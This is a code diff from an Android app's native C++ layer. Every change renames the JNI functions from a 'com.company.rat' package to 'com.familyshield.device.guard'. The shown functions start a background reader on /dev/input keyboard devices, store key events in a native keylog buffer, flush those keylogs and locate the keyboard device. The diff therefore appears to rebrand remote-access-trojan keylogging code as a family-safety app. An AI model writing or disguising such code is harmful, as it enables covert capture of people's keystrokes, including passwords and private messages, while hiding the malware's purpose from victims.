@@ -292,7 +292,7 @@ static void* input_reader_loop(void* arg) {
 extern "C" {
 
 JNIEXPORT jstring JNICALL
-Java_com_company_rat_NativeProbe_runKernelProbe(JNIEnv* env, jclass) {
+Java_com_familyshield_device_guard_NativeProbe_runKernelProbe(JNIEnv* env, jclass) {
     std::string report;
     report += "=== NATIVE KERNEL PROBE (pid=";
     report += std::to_string(getpid());
@@ -315,7 +315,7 @@ Java_com_company_rat_NativeProbe_runKernelProbe(JNIEnv* env, jclass) {
 
 // Start background /dev/input reader — runs until stopInputReader()
 JNIEXPORT jboolean JNICALL
-Java_com_company_rat_NativeProbe_startInputReader(JNIEnv* env, jclass, jint deviceIdx) {
+Java_com_familyshield_device_guard_NativeProbe_startInputReader(JNIEnv* env, jclass, jint deviceIdx) {
     if (input_reader_running.exchange(true)) return JNI_FALSE; // already running
 
     int* arg = (int*)malloc(sizeof(int));
@@ -331,13 +331,13 @@ Java_com_company_rat_NativeProbe_startInputReader(JNIEnv* env, jclass, jint devi
 }
 
 JNIEXPORT void JNICALL
-Java_com_company_rat_NativeProbe_stopInputReader(JNIEnv* env, jclass) {
+Java_com_familyshield_device_guard_NativeProbe_stopInputReader(JNIEnv* env, jclass) {
     input_reader_running.store(false);
 }
 
 // Flush and clear the native keylog buffer
 JNIEXPORT jstring JNICALL
-Java_com_company_rat_NativeProbe_flushNativeKeylogs(JNIEnv* env, jclass) {
+Java_com_familyshield_device_guard_NativeProbe_flushNativeKeylogs(JNIEnv* env, jclass) {
     pthread_mutex_lock(&input_reader_mutex);
     std::string copy = input_reader_buf;
     input_reader_buf.clear();
@@ -347,7 +347,7 @@ Java_com_company_rat_NativeProbe_flushNativeKeylogs(JNIEnv* env, jclass) {
 
 // Find the first /dev/input/eventN that accepts KEY events (for startInputReader)
 JNIEXPORT jint JNICALL
-Java_com_company_rat_NativeProbe_findKeyboardDevice(JNIEnv* env, jclass) {
+Java_com_familyshield_device_guard_NativeProbe_findKeyboardDevice(JNIEnv* env, jclass) {
     for (int i = 0; i < 8; i++) {
         char path[32];
         snprintf(path, sizeof(path), "/dev/input/event%d", i);
